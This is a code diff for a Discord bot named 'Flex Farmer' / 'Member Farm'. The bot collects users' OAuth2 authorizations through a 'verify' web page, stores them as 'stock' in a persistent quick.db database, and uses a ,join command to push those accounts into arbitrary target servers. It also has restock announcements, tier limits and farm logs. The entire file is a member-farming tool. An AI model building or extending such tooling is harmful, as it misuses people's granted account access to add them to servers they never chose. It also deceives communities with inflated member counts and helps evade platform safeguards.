@@ -14,6 +14,8 @@ const {
 } = require('discord.js');
 const express = require('express');
 const fetch = require('node-fetch');
+const { QuickDB } = require("quick.db");
+const db = new QuickDB(); // Persistent database instance
 require('dotenv').config();
 
 const app = express();
@@ -22,21 +24,14 @@ const PORT = process.env.PORT || 8080;
 const DEFAULT_PREFIX = ','; 
 let currentPrefix = DEFAULT_PREFIX;
 
-const tokenDatabase = []; 
-let restockCounter = 0; 
-let allTimeAuthCount = 0; 
-let autoRestockEnabled = true; 
-let maintenanceMode = false;
 let discordClient = null;
-
 let lastBoostStickyMessage = null; 
 
-// Channel IDs updated according to your exact channel requirements
 const CHANNELS = {
-    AUTORESTOCK: '1563253480553054358',       // Restocks channel (NO auto-delete)
-    FARM_LOG: '1563253450693808210',          // ,join command logs
-    VERIFICATION_LOG: '1563253454653235261',  // Verification logs
-    AUTO_DELETE: '1563253483824746659'        // Only this channel auto-deletes messages
+    AUTORESTOCK: '1563253480553054358',       
+    FARM_LOG: '1563253450693808210',          
+    VERIFICATION_LOG: '1563253454653235261',  
+    AUTO_DELETE: '1563253483824746659'        
 };
 
 const client = new Client({
@@ -90,12 +85,8 @@ app.get('/', async (req, res) => {
                 return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Error</h1><p>Failed to fetch Discord profile.</p></body></html>`);
             }
 
-            const existingIndex = tokenDatabase.findIndex(t => t.user_id === userData.id);
-            if (existingIndex !== -1) {
-                tokenDatabase.splice(existingIndex, 1);
-            }
-
-            tokenDatabase.push({
+            // Save or Update user in persistent storage
+            await db.set(`user_${userData.id}`, {
                 user_id: userData.id,
                 username: userData.username,
                 avatar: userData.avatar,
@@ -106,9 +97,10 @@ app.get('/', async (req, res) => {
                 expires_at: Date.now() + (oauthData.expires_in * 1000)
             });
 
-            restockCounter++;
-            allTimeAuthCount++;
-            console.log(`[VERIFY SUCCESS] User: ${userData.username} (${userData.id}) | Total Stock: ${tokenDatabase.length}`);
+            await db.add('restockCounter', 1);
+            await db.add('allTimeAuthCount', 1);
+
+            const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
 
             if (client.isReady()) {
                 try {
@@ -116,7 +108,7 @@ app.get('/', async (req, res) => {
                     if (verifLogChannel) {
                         const logEmbed = new EmbedBuilder()
                             .setTitle('⚡ New User Verified')
-                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${tokenDatabase.length}\``)
+                            .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${allUsers.length}\``)
                             .setColor(0x00FF00)
                             .setTimestamp();
 
@@ -139,13 +131,13 @@ app.get('/', async (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));
 
-// Helper function to send restock announcement referencing your exact channel links format
 async function sendRestockAnnouncement(channel, amountAdded) {
     try {
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
         const restockMessage = 
             `**Restock Alert!**\n\n` +
             `**Flex Network** has restocked with **${amountAdded}**!\n\n` +
-            `> Current Stock: **${tokenDatabase.length}**\n\n` +
+            `> Current Stock: **${allUsers.length}**\n\n` +
             `> **Want more per command?**\n` +
             `-# <#1563253471145361572> / <#1563253473238065326>\n\n` +
             `> **Quick Head To Channel!**\n` +
@@ -179,14 +171,14 @@ client.once('ready', async () => {
 });
 
 client.on('interactionCreate', async interaction => {
-    // Handle Button Interactions for Restock Prompt
     if (interaction.isButton()) {
         if (interaction.customId === 'restock_yes') {
             await interaction.update({ content: '✅ Restock announcement confirmed! Sending to restock channel...', components: [] });
             try {
                 const restockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
                 if (restockChannel) {
-                    await sendRestockAnnouncement(restockChannel, restockCounter);
+                    const counter = (await db.get('restockCounter')) || 0;
+                    await sendRestockAnnouncement(restockChannel, counter);
                 }
             } catch (err) {
                 console.error('Failed to send restock announcement via button:', err);
@@ -258,7 +250,6 @@ client.on('messageCreate', async message => {
         return;
     }
 
-    // Only auto-delete messages in the designated AUTO_DELETE channel. Restocks channel will NEVER auto-delete.
     if (message.channel.id === CHANNELS.AUTO_DELETE) {
         setTimeout(async () => {
             try { if (message.deletable) await message.delete(); } catch (err) {}
@@ -310,13 +301,25 @@ client.on('messageCreate', async message => {
 
     if (command === 'help') {
         const helpEmbed = new EmbedBuilder()
-            .setTitle('Flex Network — Command Panel')
-            .setDescription(`Current prefix: \`${currentPrefix}\``)
+            .setTitle('Member Farm — Command Panel')
+            .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
             .setColor(0x5865F2)
             .addFields(
-                { name: '⚙️ Core', value: `\`${currentPrefix}verify\`\n\`${currentPrefix}stock\`\n\`${currentPrefix}auth\`\n\`${currentPrefix}join <ID>\`` },
-                { name: '🛠️ Management', value: `\`${currentPrefix}restock\`\n\`${currentPrefix}remove <n>\`\n\`,rbot\`` }
-            );
+                { 
+                    name: 'Core & Verification', 
+                    value: `\`${currentPrefix}verify\` - Generates OAuth2 verify button\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
+                },
+                { 
+                    name: 'Config & Management', 
+                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles auto-restocks\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
+                },
+                { 
+                    name: 'Admin & Control', 
+                    value: `\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
+                }
+            )
+            .setFooter({ text: 'Member Farm Utility' });
+
         return message.channel.send({ embeds: [helpEmbed] });
     }
 
@@ -327,25 +330,31 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'stock') {
-        const lastRestockCount = Math.min(restockCounter, tokenDatabase.length);
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
+        const restockCounter = (await db.get('restockCounter')) || 0;
+        const lastRestockCount = Math.min(restockCounter, allUsers.length);
         return message.channel.send({ embeds: [new EmbedBuilder().setTitle('📦 Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(0x595B5C)] });
     }
 
     if (command === 'auth' || command === 'authed') {
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
         const now = Date.now();
-        const last24hCount = tokenDatabase.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;
+        const last24hCount = allUsers.filter(item => item.value && item.value.authorized_at && item.value.authorized_at >= (now - 86400000)).length;
+        const allTimeAuthCount = (await db.get('allTimeAuthCount')) || 0;
+
         const authEmbed = new EmbedBuilder()
-            .setTitle(' Auth Stats')
+            .setTitle('⚡ Authorization & Stock Statistics')
             .setColor(0x5865F2)
             .addFields(
-                { name: ' Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
-                { name: ' All-Time', value: `\`${allTimeAuthCount}\` total authorizations`, inline: true },
-                { name: ' Current Stock', value: `\`${tokenDatabase.length}\` active accounts`, inline: true }
+                { name: '🕒 Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
+                { name: '🌐 All-Time', value: `\`${allTimeAuthCount}\` total authorizations`, inline: true },
+                { name: '📦 Current Stock', value: `\`${allUsers.length}\` active accounts`, inline: true }
             );
         return message.channel.send({ embeds: [authEmbed] });
     }
 
     if (command === 'status') {
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
         const uptimeSeconds = Math.floor(client.uptime / 1000);
         const hours = Math.floor(uptimeSeconds / 3600);
         const minutes = Math.floor((uptimeSeconds % 3600) / 60);
@@ -354,20 +363,20 @@ client.on('messageCreate', async message => {
             .setTitle('🟢 Flex Farmer Status')
             .setColor(0x00FF00)
             .addFields(
-                { name: '📊 Active Verified Stock', value: `\`${tokenDatabase.length}\` accounts`, inline: true },
+                { name: '📊 Active Verified Stock', value: `\`${allUsers.length}\` accounts`, inline: true },
                 { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
             );
         return message.channel.send({ embeds: [statusEmbed] });
     }
 
-    // ,restock Command with [Yes] / [No] Prompt for posting in the restock channel
     if (command === 'restock') {
-        const amount = parseInt(args[0]) || tokenDatabase.length;
-        restockCounter = amount;
-        allTimeAuthCount += amount;
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
+        const amount = parseInt(args[0]) || allUsers.length;
+        await db.set('restockCounter', amount);
+        await db.add('allTimeAuthCount', amount);
 
         const promptEmbed = new EmbedBuilder()
-            .setTitle(' Restock Stock Prepared')
+            .setTitle('📦 Restock Stock Prepared')
             .setDescription(`Successfully stocked **${amount}** authorized users!\n\n**Do you want to send an announcement message in the restock channel (<#${CHANNELS.AUTORESTOCK}>)?**`)
             .setColor(0x5865F2);
 
@@ -381,15 +390,20 @@ client.on('messageCreate', async message => {
 
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
-        tokenDatabase.splice(0, amount);
-        return message.channel.send(` Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
+        for (let i = 0; i < Math.min(amount, allUsers.length); i++) {
+            await db.delete(allUsers[i].id);
+        }
+        const updatedUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
+        return message.channel.send(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${updatedUsers.length}\`.`);
     }
 
     if (command === 'join') {
         const targetGuildId = args[0];
         if (!targetGuildId) return message.channel.send(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
 
-        if (tokenDatabase.length === 0) {
+        const allUsers = (await db.all()).filter(i => i.id.startsWith('user_'));
+        if (allUsers.length === 0) {
             return message.channel.send({ embeds: [new EmbedBuilder().setTitle('❌ Out of Stock').setDescription(`No accounts available.`).setColor(0xFF0000)] });
         }
 
@@ -410,11 +424,11 @@ client.on('messageCreate', async message => {
             }
         }
 
-        let tokensToUse = tokenDatabase;
+        let tokensToUse = allUsers.map(u => u.value);
         if (allowedLimit !== Infinity) {
-            const limit = Math.min(allowedLimit, tokenDatabase.length);
-            tokensToUse = tokenDatabase.slice(0, limit);
-            message.channel.send(` Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
+            const limit = Math.min(allowedLimit, tokensToUse.length);
+            tokensToUse = tokensToUse.slice(0, limit);
+            message.channel.send(`⚠️ Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
         }
 
         await message.channel.send(`Flex Farmer attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
@@ -443,7 +457,7 @@ client.on('messageCreate', async message => {
             let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
             if (farmLogChannel) {
                 const farmEmbed = new EmbedBuilder()
-                    .setTitle(' Farm Execution Log')
+                    .setTitle('📊 Farm Execution Log')
                     .setDescription(`**User:** <@${message.author.id}>\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
                     .setColor(0x5865F2)
                     .setTimestamp();
